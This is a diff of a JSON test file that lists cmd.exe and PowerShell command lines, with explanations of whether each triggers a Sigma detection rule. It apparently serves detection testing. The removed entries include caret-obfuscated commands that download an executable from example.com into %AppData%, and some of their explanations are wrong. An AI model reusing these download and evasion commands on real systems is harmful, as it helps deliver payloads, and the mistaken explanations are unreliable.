@@ -1,38 +1,22 @@
 [
   {
-    "output": "cmd.exe /c \"curl -o \"%AppData%\\test.exe\" http://example.com/test.exe\"",
-    "explanation": "This command uses standard syntax and includes both the URL and AppData string as required by the Sigma rule. It is a direct match and will trigger the rule."
+    "output": "cmd.exe /c set url=http://example.com & echo %AppData% !url!",
+    "explanation": "Removed unnecessary quotes while preserving the command's behavior. The command still includes the URL and AppData string as required by the Sigma rule."
   },
   {
-    "output": "cmd.exe /c \"curl -o %AppData%\\test.exe h^t^t^p^:^/^/example.com/test.exe\"",
-    "explanation": "This command uses character splitting on the URL (e.g., h^t^t^p^:^/^/) to obfuscate the URL slightly, but it still contains the required URL and AppData string. It will trigger the Sigma rule."
+    "output": "cmd.exe /c \"set url=http://example.com\" \"& echo %AppData% !url!\"",
+    "explanation": "Inserted additional quotes around command parts to test parsing behavior, but the command remains functionally equivalent to the original."
   },
   {
-    "output": "cmd.exe /c \"curl -o \"%AP^PDATA%\\test.exe\" http://example.com/test.exe\"",
-    "explanation": "This command uses insertion (caret) to obfuscate the AppData environment variable slightly. It still contains the required URL and AppData string, so it will trigger the Sigma rule."
+    "output": "cmd.exe /c echo %AppData% & set url=http://example.com",
+    "explanation": "Reordered the commands in the execution chain. The command still contains the required URL and AppData string."
   },
   {
-    "output": "cmd.exe /c \"curl -o \"%USERPROFILE%\\AppData\\Roaming\\test.exe\" http://example.com/test.exe\"",
-    "explanation": "This command replaces %AppData% with its full path equivalent. While it does not use the %AppData% string directly, it still contains a URL and a path to AppData. Depending on the Sigma rule's detection logic, it may or may not trigger the rule."
+    "output": "cmd.exe /c set url=http://example.com ^& echo %AppData% !url!",
+    "explanation": "Replaced the ampersand with an escaped caret to test parsing behavior, but the command remains functionally equivalent."
   },
   {
-    "output": "cmd.exe /c \"curl -o test.exe http://example.com/test.exe\"",
-    "explanation": "This command lacks the %AppData% string, so it will not trigger the Sigma rule."
-  },
-  {
-    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://example.com/test.exe' -OutFile $env:APPDATA\\test.exe\"",
-    "explanation": "This command uses PowerShell instead of cmd.exe, so it does not match the logsource condition (which is limited to cmd.exe). It will not trigger the Sigma rule."
-  },
-  {
-    "output": "cmd.exe /c \"curl h^tt^pexample.com/file.exe -o %AP^PDATA%\\file.exe\"",
-    "explanation": "This command uses character splitting on both the URL and the AppData string. It still contains the required URL and AppData string, so it will trigger the Sigma rule."
-  },
-  {
-    "output": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=file.exe&& call curl %protocol%%url% -o %dest%\"",
-    "explanation": "This command uses environment variables to split the URL into parts. It still contains the required URL and AppData string, so it will trigger the Sigma rule."
-  },
-  {
-    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://example.com/payload.exe -OutFile $env:APPDATA\\payload.exe\"",
-    "explanation": "This command uses PowerShell instead of cmd.exe, so it does not match the logsource condition (which is limited to cmd.exe). It will not trigger the Sigma rule."
+    "output": "cmd.exe /c set url=http://example.com & echo \"%AppData%\" !url!",
+    "explanation": "Inserted quotes around %AppData% to test parsing behavior, but the command still includes the required URL and AppData string."
   }
 ]
